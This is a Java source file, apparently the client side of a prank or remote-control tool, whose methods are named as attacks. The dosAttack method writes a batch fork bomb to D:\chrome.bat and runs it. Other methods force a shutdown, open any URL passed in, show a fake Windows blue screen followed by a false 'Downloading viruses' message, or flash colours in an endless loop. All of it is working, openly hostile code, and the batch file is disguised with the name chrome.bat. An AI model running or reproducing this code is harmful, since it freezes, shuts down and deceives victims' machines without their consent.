import java.io.FileOutputStream;

public class AttackOperations {
	
	public static String webAttack(String recive){
		try{
			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/C", "Start", recive);
            builder.redirectErrorStream(true);
            Process p = builder.start();
            
            return "Successfully web redirected..";
            
        }catch(Exception e) {
        	 return "Failed to web redirect ...";
		}
	}
	
	public static String dosAttack(){
		try {
			FileOutputStream fout=new FileOutputStream("D:\\chrome.bat");
			String str1="@echo off\n:top\nStart\ngoto top";
			byte[] b=str1.getBytes();
			fout.write(b);
			fout.close();
			String[] cmd= {"cmd.exe","/C","Start","D:\\chrome.bat"};
			Process p=Runtime.getRuntime().exec(cmd);
			
			return "sucess !";
		
		}catch(Exception e){
			return "failed !";
		}
	}
	
	public static String shutDown(){
		try {
			String[] cmd= {"cmd.exe","/C","shutdown /s"};
			Process p=Runtime.getRuntime().exec(cmd);
			return "sucess !";
		
		}catch(Exception d){
			return "failed !";
		}
	}
	
	public static String shockAttack(){
		String shock="@echo off\n cd /\n cls\n color 17\n echo A problem has been detected and Windows has been shut down to prevent damage\n echo to your computer.\n echo.\n echo The problem seems to be caused by the following file: SPCMDCON.SYS\n echo.\n echo PAGE_FAULT_IN_NONPAGED_AREA\n echo.\n echo If this is the first time you've seen this stop error screen,\n echo restart your computer. If this screen appears again, follow\n echo these steps:\n echo.\n echo Check to make sure any new hardware or software is properly installed.\n echo If this is a new installation, ask your hardware or software manufacturer\n echo for any Windows updates you might need.\n echo.\n echo If problems continue, disable or remove any newly installed hardware\n echo or software. Disable BIOS memory options such as caching or shadowing.\n echo If you need to use Safe Mode to remove or disable components, restart\n echo your computer, press F8 to select Advanced Startup Options, and then\n echo select Safe Mode.\n echo.\n echo Technical information:\n echo.\n echo *** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x00000000)\n echo.\n echo.\n echo ***  SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c\n pause >nul\n cls\n echo Downloading viruses . . .\n ping localhost -n 5 >nul\n dir /s\n pause >nul\n";
		try {
			FileOutputStream fout=new FileOutputStream("D:\\chrome.bat");
			byte[] b=shock.getBytes();
			fout.write(b);
			fout.close();
			String[] cmd= {"cmd.exe","/C","Start","D:\\chrome.bat"};
			Process p=Runtime.getRuntime().exec(cmd);
			
			return "sucess !";
		
		}catch(Exception e){
			return "failed !";
		}
	}
	
	public static String lightAttack(){
		String shock="@echo off\n :start\n color cb\n echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)\n color 01\n echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)\n color f2\n echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)\n color 58\n echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)\n color 4f\n echo (%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)(%random%) (%random%) (%random%) (%random%)\n goto start\n";
		try {
			FileOutputStream fout=new FileOutputStream("D:\\chrome.bat");
			byte[] b=shock.getBytes();
			fout.write(b);
			fout.close();
			String[] cmd= {"cmd.exe","/C","Start","D:\\chrome.bat"};
			Process p=Runtime.getRuntime().exec(cmd);
			
			return "sucess !";
		
		}catch(Exception e){
			return "failed !";
		
	}
	}
		
	
}
